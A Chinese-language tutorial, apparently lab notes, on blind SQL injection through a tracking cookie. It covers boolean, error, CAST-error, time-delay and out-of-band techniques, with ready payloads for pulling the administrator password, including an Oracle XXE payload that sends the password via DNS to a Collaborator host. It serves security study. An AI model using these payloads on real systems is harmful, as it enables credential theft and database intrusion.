基于条件响应的SQL盲注#

考虑一个使用跟踪Cookie收集使用数据分析的应用。对应用程序的请求包含如下的 cookie 头：

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

当处理包含 cookie 的请求时，应用程序会使用 SQL 查询来确定该用户是否为已知用户：

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

该查询存在SQL注入的漏洞，但查询结果不会返回给用户。然而，应用程序的行为会根据查询是否返回数据而有所不同。如果提交已识别的TrackingId，查询会返回数据，回复中会显示“Welcome back”的消息。于是，可以这样测试是否存在注入点：TrackingId=

1xyz' AND 1=1 --+  # 显示“Welcome back”
2xyz' AND 1=2 --+  # 不显示

继续在TrackingId后进行注入实验：

1' AND (SELECT 'a' FROM users LIMIT 1)='a  # 若返回了"Welcome back"，说明存在表users
2
3' AND (SELECT 'a' FROM users WHERE username='administrator')='a  # 存在用户名 administrator
4
5' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a  # 判断密码长度大于1
6
7' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='a  # 用于判断密码的第3个字符值是否为a

可以在Grep-Match中进行匹配爆破

基于条件错误的SQL盲注#

有些应用程序执行SQL查询，但无论查询是否返回数据，行为都不会改变。通常可以根据是否出现SQL错误，诱导应用程序返回不同的响应。比如，还是上面的更改Cookie中的TrackingId：

 1'||(SELECT '')||'  # 非Oracle数据库执行
 2'||(SELECT '' FROM dual)||'  # Oracle数据库执行
 3'||(SELECT '' FROM not-a-real-table)||'  # 如果报错，则可以确定存在注入
 4'||(SELECT '' FROM users WHERE ROWNUM = 1)||'  # 验证表users的存在
 5
 6'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'  # 报错则administrator用户存在
 7
 8'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'  # 检测密码长度
 9
10'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'  # 测试密码第1个字符是否是a

基于可见错误的SQL注入#

数据库配置错误有时会导致冗长错误信息。这些信息可能对攻击者有用。让应用程序生成包含部分查询返回数据的错误消息，这实际上将原本盲目的SQL注入漏洞变成了可见的漏洞。可以用CAST()函数来实现这个功能。它允许将一种数据类型转换为另一种。假设已知列名username和password，以及用户名administrator：

1' AND 1=CAST((SELECT 1) AS int)--  # 服务器正常回显，表明这是一个有效的查询
2' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--  # 查询用户名
3' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--  # 查询密码

时延SQL盲注#

如果应用程序在执行SQL查询时发现了数据库错误并优雅地处理，那么应用程序的响应就不会有任何区别。这意味着之前诱导条件错误的技术将无法起作用。在这种情况下，通常可以通过根据注入条件为真或假触发时间延迟来利用盲目SQL注入漏洞。由于SQL查询通常由应用程序同步处理，延迟SQL查询的执行也会延迟HTTP响应。这使得能够根据收到HTTP响应所需的时间来判断注入条件的真实性。 例如：

1'||pg_sleep(10)--  # 延迟10秒

带有时间延迟和信息检索的SQL盲注#

触发时间延迟的技术因所用数据库类型而异。例如，在 Microsoft SQL Server 上，您可以使用以下方法测试条件并根据表达式是否为真触发延迟：

1'; IF (1=2) WAITFOR DELAY '0:0:10'--  # 第一个输入不会触发延迟，因为该条件为假
2'; IF (1=1) WAITFOR DELAY '0:0:10'--  # 第二次输入触发10秒的延迟，因为该条件为真

假如数据库版本是PostgreSQL（只能靠猜了），则在BurpSuite中可以这样做（对分号编码为%3B以实现堆叠查询，从而独立执行一条新的 SELECT 语句）：

1'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- 
2'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  # 延时说明存在administrator用户
3'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  # 判断密码长度
4'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--  # 判断密码第1个字符是a

将BurpSuite的资源池改为最大为1线程，添加响应列查看响应时间进行判断

带外交互的SQL盲注#

应用程序可能会执行与前述相同的SQL查询，但采用异步方式。应用程序继续在原始线程中处理用户请求，并使用另一线程使用追踪 Cookie 执行 SQL 查询。查询仍易受SQL注入影响，但目前描述的技术都无法使用。应用程序的响应不依赖于查询返回任何数据、数据库错误发生，或查询执行所需时间。

在这种情况下，通常可以通过触发对控制系统的带外**(Out-of-Band)** 网络交互来利用盲目SQL注入漏洞。这些可以根据注入条件触发，逐条推断信息。更有用的是，数据可以直接在网络交互中被窃取。

可以使用多种网络协议来实现这一目的，但通常最有效的是DNS（域名服务）。许多生产网络允许DNS查询自由出口，因为它们对生产系统的正常运行至关重要。例如，Microsoft SQL Server上的以下输入可用于对指定域名进行DNS查询：

'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

这会导致数据库对以下域进行查找：

0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net

再比如，在Oracle中进行：

1' UNION SELECT EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual--

上面这段翻译过来就是：

1' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote; ]>'),'/l') FROM dual--

各部分函数：

  • ' UNION SELECT ... FROM dual--
    用 UNION 将当前查询与一个自定义的 SELECT 合并，dual 是 Oracle 的虚拟表，确保语法正确。
  • EXTRACTVALUE(xmltype(...), '/l')
    Oracle 函数：xmltype 将字符串解析为 XML，EXTRACTVALUE 提取 XPath 路径 /l 的值。这里 /l 并不存在，目的是触发 XML 解析过程，而不是真正提取数据。
  • XML 内容
    • 定义了一个外部实体 %remote，其 SYSTEM 标识符指向一个动态构造的 URL。
    • 实体引用 %remote; 会触发解析器尝试获取该外部资源，导致向构造的域名发起 HTTP 或 DNS 请求。

当数据库执行此 XML 解析时，它会将密码拼接进域名，并向攻击者控制的服务器 BURP-COLLABORATOR-SUBDOMAIN 发起 DNS 查询（若 HTTP 不可达，通常回退到 DNS 解析）。攻击者通过监听该域名的 DNS 请求日志，即可获取密码明文。

现在需要在BurpSuite中开启collaborator，复制服务器地址替换BURP-COLLABORATOR-SUBDOMAIN。send之后pull now拉取数据

带外交互获取数据实现SQL盲注#

可以将SQL注入与基本的XXE技术结合，例如：

1' UNION SELECT EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//'||(SELECT password FROM users WHERE username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual--

在显示的DNS结果中显示密码
